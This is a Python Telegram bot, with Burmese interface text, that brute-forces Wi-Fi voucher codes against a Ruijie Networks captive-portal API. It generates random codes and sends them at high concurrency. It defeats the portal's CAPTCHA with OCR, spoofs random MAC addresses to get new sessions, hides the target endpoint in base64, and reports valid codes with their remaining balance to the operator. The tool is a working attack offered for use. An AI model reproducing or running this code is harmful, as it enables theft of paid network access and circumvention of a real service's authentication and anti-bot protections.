#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Railway-Ready Voucher Bot (Fixed)
- Webhook-based
- Health checks
- Graceful shutdown
- Retry logic & circuit breaker
"""

import os, sys, signal, json, base64, random, re, string, time, uuid, logging
import asyncio, aiohttp
from aiohttp import web
from datetime import datetime, timezone
from urllib.parse import urlparse
import ipaddress

# telebot
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update

# OCR (lazy load to save Railway memory)
OCR_AVAILABLE = False
try:
    import cv2
    import ddddocr
    import numpy as np
    OCR_AVAILABLE = True
except ImportError:
    pass

# ── Logging ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("voucher_bot")

# ── Environment ───────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
ADMIN_ID = os.environ.get("ADMIN_ID", "").strip()
RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", os.environ.get("RAILWAY_STATIC_URL", "")).strip()
PORT = int(os.environ.get("PORT", "8080"))
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", BOT_TOKEN.split(":")[-1] if ":" in BOT_TOKEN else "secret")

if not BOT_TOKEN or not ADMIN_ID:
    logger.error("BOT_TOKEN and ADMIN_ID env vars required!")
    sys.exit(1)

# ── Globals ───────────────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
notify_setting = {}
last_scan_params = {}
pending_brute = {}
success_messages = {}
limited_messages = {}

session: aiohttp.ClientSession = None
_connector: aiohttp.TCPConnector = None
_voucher_sem: asyncio.Semaphore = None

CONCURRENCY = 150  # Railway free tier အတွက် 150 မှ 200 ကြား
CONSECUTIVE_ERRORS_THRESHOLD = 50
CIRCUIT_BREAKER_DURATION = 60

_start_time = time.monotonic()
_shutting_down = False

BRUTE_MODES = {
    "1": {"name": "ဂဏန်းသီးသန့် (0-9)", "charset": string.digits},
    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)", "charset": string.ascii_lowercase},
    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)", "charset": string.ascii_uppercase},
    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)", "charset": string.ascii_letters},
    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)", "charset": string.ascii_lowercase + string.digits},
}

POST_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

# ── Retry Decorator ───────────────────────────────────────────────────────
def telegram_retry(max_retries=5, base_delay=1.0):
    def decorator(func):
        async def wrapper(*args, **kwargs):
            delay = base_delay
            for attempt in range(max_retries):
                try:
                    return await func(*args, **kwargs)
                except Exception as e:
                    err_str = str(e).lower()
                    if "retry after" in err_str:
                        wait = 30
                        m = re.search(r"retry after (\d+)", err_str)
                        if m:
                            wait = int(m.group(1))
                        logger.warning(f"Rate limit, sleep {wait}s")
                        await asyncio.sleep(wait)
                    elif "timeout" in err_str:
                        logger.warning(f"Telegram timeout (attempt {attempt+1})")
                        await asyncio.sleep(delay)
                    else:
                        logger.warning(f"Telegram error: {e} (attempt {attempt+1})")
                        await asyncio.sleep(delay)
                    delay = min(delay * 2, 30)
            logger.error(f"Failed after {max_retries} retries: {func.__name__}")
            return None
        return wrapper
    return decorator

# ── Helpers ───────────────────────────────────────────────────────────────
def is_admin(chat_id: int) -> bool:
    return str(chat_id) == str(ADMIN_ID)

def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    return f"{hours}h {mins}m" if hours > 0 else (f"{mins}m" if mins > 0 else f"{secs}s")

def _parse_minutes(val):
    total = int(val)
    if total <= 0:
        return "0m"
    if total < 60:
        return f"{total}m"
    h = total // 60
    m = total % 60
    if h < 24:
        return f"{h}h {m}m" if m else f"{h}h"
    d = h // 24
    rh = h % 24
    if d < 30:
        return f"{d}d {rh}h" if rh else f"{d}d"
    mo = d // 30
    rd = d % 30
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

def iter_codes(mode, length):
    charset = BRUTE_MODES[str(mode)]["charset"]
    while True:
        yield "".join(random.choice(charset) for _ in range(length))

def format_progress(checked, speed=0, found=0, target=None, mode=None, length=None):
    mode_name = BRUTE_MODES.get(str(mode), {}).get("name", "") if mode else ""
    lines = ["📋 Status: Running"]
    if mode_name:
        lines.append(f"🎯 Mode: {mode_name}")
    if length:
        lines.append(f"📏 Length: {length}")
    lines += [f"⚡ Speed: {speed:,.0f}/min", f"🔍 Checked: {checked:,}", f"💎 Found: {found}"]
    if target:
        lines.append(f"🏆 Target: {found}/{target}")
    return "\n".join(lines)

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return False
        host = parsed.hostname or ""
        if not host or host.lower() in ("localhost", "0.0.0.0"):
            return False
        try:
            addr = ipaddress.ip_address(host)
            if addr.is_loopback or addr.is_private or addr.is_link_local or addr.is_reserved or addr.is_unspecified or addr.is_multicast:
                return False
        except ValueError:
            pass
        return True
    except Exception:
        return False

# ── OCR (Lazy Load) ───────────────────────────────────────────────────────
_ocr = None

def get_ocr():
    global _ocr
    if _ocr is None and OCR_AVAILABLE:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
            logger.info("OCR engine loaded")
        except Exception as e:
            logger.error(f"OCR load failed: {e}")
    return _ocr

def _ocr_sync(image_bytes):
    ocr_engine = get_ocr()
    if ocr_engine is None:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode('.png', thresh)
        return ocr_engine.classification(buf.tobytes()).upper()
    except Exception as e:
        logger.error(f"OCR error: {e}")
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, prev=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True,
                                   timeout=aiohttp.ClientTimeout(total=15)) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev
    except Exception as e:
        logger.debug(f"get_session_id: {e}")
        return prev

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    async with session_obj.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers, json={'sessionId': session_id, 'authCode': text},
        timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        data = await req.json(content_type=None)
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    if not is_safe_url(session_url):
        return False
    headers = {
        'accept': 'text/html,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        async with session.get(session_url, allow_redirects=False, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=15)) as first:
            location = first.headers.get("Location", "")
            if location and is_safe_url(location):
                async with session.get(location, allow_redirects=False, headers=headers,
                                        timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    return "sessionId" in str(resp.url) or "sessionId" in location
            return "sessionId" in str(first.url) or "sessionId" in location
    except Exception as e:
        logger.error(f"check_session_url: {e}")
        return False

async def get_balance(token):
    urls = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{token}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{token}",
    ]
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    for url in urls:
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json(content_type=None)
                candidates = [data]
                for k in ['result', 'data']:
                    if isinstance(data, dict) and isinstance(data.get(k), dict):
                        candidates.append(data[k])
                for d in candidates:
                    if not isinstance(d, dict):
                        continue
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                        if d.get(key) is not None:
                            return _parse_minutes(d[key])
                    for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft']:
                        if d.get(key) is not None:
                            return _parse_seconds(d[key])
        except Exception as e:
            logger.debug(f"get_balance {url}: {e}")
    return "N/A"

# ── Core voucher check with circuit breaker ───────────────────────────────
_consecutive_errors = 0
_circuit_open_until = 0

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _consecutive_errors, _circuit_open_until

    if time.monotonic() < _circuit_open_until:
        logger.warning("Circuit breaker OPEN, skipping check")
        return None

    if not recheck:
        ct = scan_tasks.get(chat_id)
        if not ct or ct.get("scan_id") != scan_id:
            return None

    response = None
    session_id = None

    for attempt in range(3):
        try:
            ts = aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=30)
            )
            async with ts:
                session_id = await get_session_id(ts, session_url)
                if not session_id:
                    continue

                auth_code = None
                for _ in range(8):
                    try:
                        img = await Captcha_Image(ts, session_id)
                        text = await Captcha_Text(img)
                        if text and await Varify_Captcha(ts, session_id, text):
                            auth_code = text
                            break
                    except Exception:
                        continue
                if not auth_code:
                    continue

                if not recheck:
                    ct = scan_tasks.get(chat_id)
                    if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
                        return None

                data = {
                    "accessCode": code, "sessionId": session_id,
                    "apiVersion": 1, "authCode": auth_code
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                try:
                    async with ts.post(POST_URL, json=data, headers=headers) as req:
                        response = await req.text()
                        logger.info(f"[voucher] code={code} attempt={attempt+1} status={req.status}")
                except Exception as e:
                    logger.debug(f"perform_check post: {e}")
                    _consecutive_errors += 1
                    return None

            if response and 'request limited' in response:
                logger.warning(f"Rate limited on code={code}, retrying ({attempt+1}/3)")
                await asyncio.sleep(2)
                continue
            break
        except Exception as e:
            logger.error(f"perform_check outer error: {e}")
            _consecutive_errors += 1
            break

    if _consecutive_errors >= CONSECUTIVE_ERRORS_THRESHOLD:
        _circuit_open_until = time.monotonic() + CIRCUIT_BREAKER_DURATION
        _consecutive_errors = 0
        logger.error(f"Circuit breaker triggered for {CIRCUIT_BREAKER_DURATION}s")

    if not response:
        return None

    if 'logonUrl' in response:
        _consecutive_errors = max(0, _consecutive_errors - 1)
        if recheck:
            return code

        plan_str = "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            tm = re.search(r'token=(.*?)&', logon_url)
            token = tm.group(1) if tm else session_id
            fetched = await get_balance(token)
            if fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})

        if notify_setting.get(chat_id, True):
            code_line = "\n".join([f"`{i['code']}` – {i['plan']}" for i in success_texts[chat_id]])
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_line}", parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n{code_line}", parse_mode="Markdown"
                    )
            except Exception:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, True):
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except Exception:
                pass

    return None

# ── Brute-force runner ────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                          target=None, message=None, progress_msg=None):
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    checked = 0
    found = 0
    scan_start = time.monotonic()
    code_iter = iter_codes(mode, length)

    try:
        while not _shutting_down:
            ct = scan_tasks.get(chat_id)
            if not ct or ct.get("scan_id") != scan_id:
                return
            if ct.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
                scan_tasks.pop(chat_id, None)
                return

            batch = [next(code_iter) for _ in range(500)]

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

            for res in results:
                if isinstance(res, Exception):
                    continue
                if res:
                    found += 1
                    if target and found >= target:
                        try:
                            await bot.edit_message_text(
                                chat_id=chat_id, message_id=progress_msg.message_id,
                                text=f"🎯 Target {target} ရောက်ပါပြီ! ရှာဖွေမှုရပ်သည်။"
                            )
                        except Exception:
                            pass
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, speed, found, target, mode, length)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id, text=text
                )
            except Exception:
                try:
                    nm = await bot.send_message(chat_id, text)
                    progress_msg.message_id = nm.message_id
                except Exception:
                    pass

    except asyncio.CancelledError:
        last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
        raise
    finally:
        scan_tasks.pop(chat_id, None)

# ── Bot Handlers ──────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
@telegram_retry(max_retries=3)
async def cmd_start(message):
    await bot.reply_to(message,
        "🤖 Railway Voucher Bot မှ ကြိုဆိုပါသည်!\n/help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။"
    )

@bot.message_handler(commands=['help'])
@telegram_retry(max_retries=3)
async def cmd_help(message):
    await bot.reply_to(message,
        "📖 Voucher Bot အသုံးပြုနည်း\n\n"
        "၁။ /setup <url>\n"
        "၂။ /brute <mode> <length> [target]\n"
        "   Mode: 1=ဂဏန်း 2=အသေး 3=အကြီး 4=စာလုံး 5=စာ+ဂဏန်း\n"
        "၃။ /status – အခြေအနေ\n"
        "၄။ /stop – ရပ်တန်\n"
        "၅။ /resume – ဆက်မယ်\n"
        "၆။ /saved – ရလဒ်\n"
        "၇။ /delete_saved – ဖျက်\n"
        "၈။ /recheck – ပြန်စစ်\n"
        "၉။ /notify – ON/OFF"
    )

@bot.message_handler(commands=['setup'])
@telegram_retry(max_retries=3)
async def cmd_setup(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup <session_url>")
        return
    url = args[1].strip()
    chat_id = message.chat.id
    await bot.reply_to(message, "⏳ Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        user_data[chat_id] = {'session_url': url}
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        pending_brute.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ!\n/brute ဖြင့် စတင်နိုင်ပါပြီ။")
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
@telegram_retry(max_retries=3)
async def cmd_brute(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n/brute <mode> <length> [target]\nဥပမာ: /brute 1 6 5")
        return

    mode_str = args[1]
    if mode_str not in BRUTE_MODES:
        await bot.reply_to(message, "❌ Mode မမှန်ပါ။ 1-5 အကြား ရွေးပါ။")
        return
    try:
        length = int(args[2])
        if not 1 <= length <= 20:
            raise ValueError
    except ValueError:
        await bot.reply_to(message, "❌ Length သည် 1-20 ကြား ဖြစ်ရပါမည်။")
        return
    target = None
    if len(args) >= 4:
        try:
            target = int(args[3])
        except ValueError:
            await bot.reply_to(message, "❌ Target သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ ရှာဖွေမှု မပြီးသေးပါ။ /stop ဦးသုံးပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("▶️ Resume", callback_data="resume_scan"),
            InlineKeyboardButton("🆕 New Scan", callback_data="new_scan")
        )
        pending_brute[chat_id] = {"mode": mode_str, "length": length, "target": target}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode:{prev['mode']} length:{prev['length']}).",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode_str, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message):
    mode_name = BRUTE_MODES[str(mode)]["name"]
    target_note = f" | Target: {target}" if target else ""
    progress_msg = await bot.send_message(
        chat_id,
        f"🔍 ရှာဖွေမှု စတင်သည်\n🎯 Mode: {mode_name}\n📏 Length: {length}{target_note}"
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(int(mode), length, chat_id,
                       user_data[chat_id]['session_url'],
                       scan_id, target,
                       message=original_message,
                       progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။",
                                         chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("▶️ ယခင် scan ပြန်စပါပြီ။",
                                     chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
    else:
        params = pending_brute.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        if params:
            await bot.edit_message_text("🆕 Scan အသစ်စတင်ပါပြီ။",
                                         chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။",
                                         chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['stop'])
@telegram_retry(max_retries=3)
async def cmd_stop(message):
    if not is_admin(message.chat.id):
        return
    data = scan_tasks.get(message.chat.id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "⏹️ ရပ်ပြီးပါပြီ။ /resume ဖြင့် ဆက်နိုင်သည်။")
    else:
        await bot.reply_to(message, "⚠️ ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
@telegram_retry(max_retries=3)
async def cmd_resume(message):
    if not is_admin(message.chat.id):
        return
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "⚠️ ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], message)
    await bot.reply_to(message, "▶️ ယခင် scan ပြန်စပါပြီ။")

@bot.message_handler(commands=['status'])
@telegram_retry(max_retries=3)
async def cmd_status(message):
    if not is_admin(message.chat.id):
        return
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    found = len(success_texts.get(chat_id, []))
    if not data or data["task"].done():
        await bot.reply_to(message, f"⚠️ ရှာဖွေမှု မရှိပါ။\n💎 Found so far: {found}")
        return
    uptime = int(time.monotonic() - _start_time)
    h, r = divmod(uptime, 3600)
    m, s = divmod(r, 60)
    await bot.reply_to(message,
        f"📋 Status: Running\n💎 Found: {found}\n⏱ Uptime: {h}h {m}m {s}s"
    )

@bot.message_handler(commands=['saved'])
@telegram_retry(max_retries=3)
async def cmd_saved(message):
    if not is_admin(message.chat.id):
        return
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "⚠️ ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    parts = []
    if success:
        parts.append(f"✅ Success Codes ({len(success)})")
        for item in success:
            parts.append(f"`{item['code']}` – {item.get('plan', 'N/A')}")
    if limited:
        parts.append(f"\n⚠️ Limited Codes ({len(limited)})")
        parts.extend(limited)
    full_text = "\n".join(parts)
    for i in range(0, len(full_text), 4096):
        await bot.send_message(chat_id, full_text[i:i+4096], parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
@telegram_retry(max_retries=3)
async def cmd_delete_saved(message):
    if not is_admin(message.chat.id):
        return
    chat_id = message.chat.id
    count = len(success_texts.get(chat_id, [])) + len(limited_texts.get(chat_id, []))
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    await bot.reply_to(message, f"✅ Code {count} ခု ဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
@telegram_retry(max_retries=3)
async def cmd_notify(message):
    if not is_admin(message.chat.id):
        return
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, True)
    await bot.reply_to(message, f"📢 Notification: {'ON ✅' if notify_setting[chat_id] else 'OFF ❌'}")

@bot.message_handler(commands=['recheck'])
@telegram_retry(max_retries=3)
async def cmd_recheck(message):
    if not is_admin(message.chat.id):
        return
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "⚠️ Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "⏳ Success codes ပြန်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        recode = await perform_check(
            user_data[chat_id]['session_url'], item["code"], chat_id, recheck=True
        )
        if recode:
            new_success.append(item)
    success_texts[chat_id] = new_success
    await bot.reply_to(message,
        f"✅ Recheck ပြီး {len(new_success)} ခု ကျန်ပါသည်။" if new_success
        else "Recheck ပြီးပါပြီ။ Success code တစ်ခုမျှ မကျန်ပါ။"
    )

# ── Web Server (Railway compatible) ───────────────────────────────────────
async def handle_health(request):
    return web.json_response({
        "status": "ok",
        "uptime": int(time.monotonic() - _start_time),
        "shutting_down": _shutting_down,
        "active_scans": len([t for t in scan_tasks.values() if not t["task"].done()])
    })

async def handle_webhook(request):
    secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if secret and secret != WEBHOOK_SECRET:
        return web.Response(status=403, text="Forbidden")

    try:
        json_str = await request.text()
        update_dict = json.loads(json_str)
        update = Update.de_json(update_dict)
        if update:
            asyncio.create_task(bot.process_new_updates([update]))
        return web.Response(status=200, text="OK")
    except Exception as e:
        logger.error(f"Webhook processing error: {e}")
        return web.Response(status=200, text="OK")  # Return 200 so Telegram doesn't retry flood

async def handle_root(request):
    return web.Response(text="Voucher Bot is running on Railway!")

async def setup_webhook():
    if not RAILWAY_DOMAIN:
        logger.warning("RAILWAY_PUBLIC_DOMAIN not set, webhook cannot be configured")
        return False
    webhook_url = f"https://{RAILWAY_DOMAIN}/webhook"
    try:
        await bot.set_webhook(
            url=webhook_url,
            secret_token=WEBHOOK_SECRET,
            drop_pending_updates=True
        )
        logger.info(f"✅ Webhook set to {webhook_url}")
        return True
    except Exception as e:
        logger.error(f"❌ Failed to set webhook: {e}")
        return False

async def delete_webhook():
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("Webhook deleted")
    except Exception as e:
        logger.error(f"Failed to delete webhook: {e}")

# ── Graceful Shutdown ─────────────────────────────────────────────────────
async def on_shutdown(app):
    global _shutting_down
    _shutting_down = True
    logger.info("Shutdown signal received, cleaning up...")

    for chat_id, data in list(scan_tasks.items()):
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()

    await asyncio.sleep(1)

    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()

    await delete_webhook()
    logger.info("Cleanup complete")

# ── Main ──────────────────────────────────────────────────────────────────
async def main():
    global session, _connector, _voucher_sem

    _connector = aiohttp.TCPConnector(
        limit=200,
        limit_per_host=50,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
        force_close=True,
    )
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector,
        connector_owner=False,
    )
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    app = web.Application()
    app.router.add_get('/', handle_root)
    app.router.add_get('/health', handle_health)
    app.router.add_post('/webhook', handle_webhook)
    app.on_shutdown.append(on_shutdown)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"🚀 HTTP server listening on 0.0.0.0:{PORT}")

    # Give Railway a moment to mark as healthy before setting webhook
    await asyncio.sleep(2)

    webhook_ok = await setup_webhook()

    if not webhook_ok:
        logger.warning("⚠️ Webhook setup failed. Bot will not receive updates via HTTP.")
        # Keep alive anyway for health checks
        while not _shutting_down:
            await asyncio.sleep(60)
    else:
        # Keep the main coroutine alive
        while not _shutting_down:
            await asyncio.sleep(3600)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
